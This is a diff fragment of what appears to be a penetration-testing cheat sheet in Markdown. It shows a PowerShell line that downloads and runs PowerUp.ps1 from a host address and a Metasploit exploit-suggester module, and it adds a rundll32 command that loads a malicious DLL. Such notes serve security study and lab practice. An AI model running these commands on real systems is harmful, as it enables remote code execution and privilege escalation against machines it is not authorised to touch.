@@ -78,3 +78,8 @@ IEX(New-Object Net.WebClient).downloadString('http://192.168.45.x/PowerUp.ps1');
 ```
 post/multi/recon/local_exploit_suggester
 ```
+
+Run malicious DLL
+```powershell
+rundll32 shell32.dll,Control_RunDLL C:\temp\mal.dll
+```
